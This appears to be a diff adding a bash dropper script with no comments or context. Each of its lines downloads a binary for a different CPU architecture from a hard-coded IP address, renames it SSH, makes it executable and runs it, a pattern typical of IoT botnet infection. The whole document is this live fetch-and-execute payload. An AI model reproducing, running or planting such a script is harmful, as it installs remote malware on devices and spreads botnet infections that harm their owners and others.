@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/x86; curl -O http://185.246.221.138/grgrgg32/x86;cat x86 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/mips; curl -O http://185.246.221.138/grgrgg32/mips;cat mips >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/mpsl; curl -O http://185.246.221.138/grgrgg32/mpsl;cat mpsl >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/arm4; curl -O http://185.246.221.138/grgrgg32/arm4;cat arm4 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/arm5; curl -O http://185.246.221.138/grgrgg32/arm5;cat arm5 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/arm6; curl -O http://185.246.221.138/grgrgg32/arm6;cat arm6 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/arm7; curl -O http://185.246.221.138/grgrgg32/arm7;cat arm7 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/ppc; curl -O http://185.246.221.138/grgrgg32/ppc;cat ppc >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/m68k; curl -O http://185.246.221.138/grgrgg32/m68k;cat m68k >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.221.138/grgrgg32/sh4; curl -O http://185.246.221.138/grgrgg32/sh4;cat sh4 >SSH;chmod +x *;./SSH
